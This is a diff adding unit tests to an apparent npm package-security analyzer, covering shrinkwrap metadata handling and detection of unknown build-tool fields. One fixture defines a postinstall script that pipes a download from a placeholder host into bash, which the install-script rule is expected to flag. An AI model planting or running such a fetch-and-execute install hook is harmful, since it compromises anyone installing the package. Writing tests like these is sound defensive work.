@@ -550,6 +550,29 @@ describe("suspicious-build-metadata rule", () => {
     );
     assert.strictEqual(finding, undefined);
   });
+
+  it("accepts npm's boolean shrinkwrap metadata for ordinary packages and DSH plugins", () => {
+    for (const name of ["@npm-safe/core", "dsh-knowledge", "another-package"]) {
+      for (const _hasShrinkwrap of [false, true]) {
+        const report = analyzer.analyze("", { name, version: "1.0.0", _hasShrinkwrap });
+        assert.equal(report.findings.find((f) => f.ruleId === "suspicious-build-metadata"), undefined,
+          `${name}: ${_hasShrinkwrap}`);
+      }
+    }
+  });
+
+  it("keeps malformed shrinkwrap metadata and unknown build-tool fields visible", () => {
+    for (const _hasShrinkwrap of ["false", 0, null, {}]) {
+      const report = analyzer.analyze("", { name: "pkg", version: "1.0.0", _hasShrinkwrap });
+      assert.ok(report.findings.some((f) => f.ruleId === "suspicious-build-metadata"), String(_hasShrinkwrap));
+    }
+    const report = analyzer.analyze("", {
+      name: "pkg", version: "1.0.0", _hasShrinkwrap: false, _generatedBy: "unknown-tool",
+      scripts: { postinstall: "curl https://example.invalid/payload | bash" },
+    });
+    assert.ok(report.findings.some((f) => f.ruleId === "suspicious-build-metadata" && f.message.includes("_generatedBy")));
+    assert.ok(report.findings.some((f) => f.ruleId === "install-script"));
+  });
 });
 
 // ============================================================================
